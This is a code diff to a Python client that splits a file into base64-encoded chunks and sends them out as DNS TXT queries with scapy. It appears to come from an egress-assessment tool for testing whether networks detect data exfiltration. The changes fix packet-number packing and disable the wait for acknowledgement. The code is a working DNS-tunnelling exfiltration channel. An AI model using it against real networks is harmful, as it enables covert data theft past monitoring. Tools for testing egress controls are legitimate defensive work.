@@ -68,9 +68,7 @@ class Client:
                     print "[*] Shutting down..."
                     sys.exit()
             else:
-                #encoded_data = base64.b64encode(str(packet_number) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])
-                packByte = struct('>I', packet_number)
-                encoded_data = base64.b64encode(str(struct('>I', packet_number)) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])
+                encoded_data = base64.b64encode(str(struct.pack('>I', packet_number)) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])
 
                 while len(encoded_data) > self.max_length:
 
@@ -92,17 +90,18 @@ class Client:
                 # Craft the packet with scapy
                 try:
                     while True:
-
                         response_packet = sr1(IP(dst=final_destination)/UDP()/DNS(
                             id=15, opcode=0,
                             qd=[DNSQR(qname=encoded_data, qtype="TXT")], aa=1, qr=0),
                             verbose=False, timeout=2)
-
+                        break
+                        '''
                         if response_packet:
                             if response_packet.haslayer(DNSRR):
                                 dnsrr_strings = repr(response_packet[DNSRR])
                                 if str(packet_number) + "allgoodhere" in dnsrr_strings:
                                     break
+                        '''
 
                 except KeyboardInterrupt:
                     print "[*] Shutting down..."
@@ -118,8 +117,9 @@ class Client:
                     id=15, opcode=0,
                     qd=[DNSQR(qname="ENDTHISFILETRANSMISSIONEGRESSASSESS" + self.file_transfer, qtype="TXT")], aa=1, qr=0),
                     verbose=True, timeout=2)
-
+                break
+                '''
                 if final_packet:
                     break
-
+                '''
         return
